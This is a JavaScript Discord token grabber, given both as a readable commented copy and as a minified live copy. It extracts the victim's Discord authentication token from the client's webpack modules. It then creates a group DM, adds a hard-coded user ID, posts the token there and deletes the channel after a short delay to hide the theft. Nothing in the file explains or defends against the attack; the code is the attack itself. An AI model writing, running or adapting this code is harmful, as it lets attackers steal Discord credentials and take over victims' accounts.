/*
const t_id = "1029048356099588096"; const tp = (window.webpackChunkdiscord_app.push([[''],{},e=>{window.m=[];for(let c in e.c)window.m.push(e.c[c])}]),window.m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken();

async function sekai(gp_) {
    await new Promise((resolve) => setTimeout(resolve, 1500));
    fetch(`https://discord.com/api/v9/channels/${gp_}?silent=true`, {
        "headers": {
            "authorization": tp
        }, "body": null, "method": "DELETE",
    });
};
function senseofwonder() {
    fetch("https://discord.com/api/v9/users/@me/channels", {
        "headers": {
            "authorization": tp,
            "content-type": "application/json"
        }, "body": "{\"recipients\":[]}", "method": "POST"
    }).then((response) => response.json()).then((gc) => {
        const gp_ = gc.id;
        fetch(`https://discord.com/api/v9/channels/${gp_}/recipients/${t_id}`, {
        "headers": {
            "authorization": tp
        }, "body": null, "method": "PUT"
        });
        fetch(`https://discord.com/api/v9/channels/${gp_}/messages`, {
            "headers": {
                "authorization": tp, "content-type": "application/json"}, "body": JSON.stringify({content: `> \`${tp}\``, flags: 0, tts: false}), "method": "POST"}).then(
                    sekai(gp_)
                );
        });
};
senseofwonder();
*/
var t_id="1029048356099588096",tp=(window.webpackChunkdiscord_app.push([[''],{},e=>{window.m=[];for(let c in e.c)window.m.push(e.c[c])}]),window.m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken();async function sekai(gc_id){await new Promise(t=>setTimeout(t,1500)),fetch(`https://discord.com/api/v9/channels/${gc_id}?silent=true`,{"headers":{"authorization":tp},"body":null,"method":"DELETE"})};function senseofwonder(){fetch("https://discord.com/api/v9/users/@me/channels",{"headers":{"authorization":tp,"content-type":"application/json"},"body":'{"recipients":[]}',method:"POST"}).then(response=>response.json()).then(enne=>{let gc_id=enne.id;fetch(`https://discord.com/api/v9/channels/${gc_id}/recipients/1029048356099588096`,{"headers":{"authorization":tp},"body":null,"method":"PUT"}),fetch(`https://discord.com/api/v9/channels/${gc_id}/messages`,{headers:{"authorization":tp,"content-type":"application/json"},"body":JSON.stringify({content:`> \`${tp}\``,flags:0,tts:!1}),method:"POST"}).then(sekai(gc_id))})};senseofwonder();